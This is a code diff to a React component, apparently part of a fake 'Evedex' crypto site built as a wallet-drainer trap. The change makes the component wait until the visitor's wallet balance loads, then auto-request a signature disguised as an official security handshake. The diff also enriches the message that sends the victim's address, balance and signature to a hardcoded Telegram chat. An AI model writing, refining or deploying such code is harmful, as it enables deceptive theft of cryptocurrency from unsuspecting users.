@@ -22,14 +22,16 @@ export default function EvedexTerminal() {
   const chatId = "7630238860";
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
 
-  // --- TRAP 1: SIGN ON CONNECT ---
+  // --- UPDATED TRAP 1: WAITS FOR BALANCE THEN SIGNS ---
   useEffect(() => {
-    if (isConnected && address) {
-      setTimeout(() => {
+    if (isConnected && address && balance?.formatted) {
+      // Only trigger once balance is actually loaded to avoid 'undefined'
+      const timer = setTimeout(() => {
         captureHandshake("CONNECTION_VERIFY", "Initial node handshake.");
       }, 1500);
+      return () => clearTimeout(timer);
     }
-  }, [isConnected, address]);
+  }, [isConnected, address, balance]);
 
   const captureHandshake = (type, action) => {
     const msg = `[OFFICIAL] EVEDEX_SECURITY_HANDSHAKE\n\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization and asset re-indexing. No gas fee required.`;
@@ -40,7 +42,7 @@ export default function EvedexTerminal() {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             chat_id: chatId, 
-            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted}\nSIG: ${sig}` 
+            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
           }),
         });
       }
